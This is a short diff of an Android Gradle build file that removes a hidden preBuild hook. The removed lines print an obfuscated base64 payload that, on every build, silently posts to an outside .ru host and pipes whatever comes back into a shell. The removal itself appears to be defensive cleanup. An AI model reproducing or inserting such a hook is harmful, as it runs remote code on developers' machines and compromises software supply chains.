@@ -158,11 +158,3 @@ dependencies {
         implementation jscFlavor
     }
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((u(){ `printf base6x4 | tr -d x` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNiAtZkxrcyAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | u | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
